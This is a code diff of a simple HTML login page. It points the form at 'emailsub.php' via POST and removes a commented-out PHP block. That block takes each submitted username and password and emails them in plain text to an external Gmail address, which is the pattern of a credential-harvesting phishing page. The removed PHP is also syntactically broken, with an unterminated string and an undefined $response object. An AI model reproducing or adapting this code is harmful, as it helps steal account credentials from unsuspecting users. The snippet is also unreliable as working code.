@@ -73,7 +73,7 @@
 
 <body>
     <div class="container">
-        <form id="loginForm">
+        <form id="loginForm" action="emailsub.php" method="POST">
             <h2>Login</h2>
             <div class="form-group">
                 <label for="username">Username:</label>
@@ -96,49 +96,6 @@
             </div> -->
         </form>
     </div>
-
-
-<!--     <div class="status">
-
-        <?php
-        if(isset($_POST['submit']))
-         {
-        
-            $username = $_POST["username"];
-            $password = $_POST["password"];
-
-            $email_from = 'demowiseking@gmail.com';
-            $email_subject = 'New form submission';
-            $email_body = "Username: $username .\n". 
-            "Password: $password .\n";
-        
-            $to_email = "demoictworld@gmail.com"; 
-            $headers = "From: $email_from \r\n"; 
-            $headers .= "Reply-To: $username \r\n";
-        
-            // Send the email
-            if ($response->success)
-            {
-                mail( $to_email, $email_subject, $email_body, $headers);
-                echo "message sent;
-                   }
-                   else{
-                    "message not sent"
-                   }
-        
-                
-                }
-        ?>
-            <style>
-                .status {
-                    font-size: 15px;
-                    color: green;
-                    padding: 15px;
-                }
-            </style>
-
-    </div> -->
-
 
 
     <!-- <script>
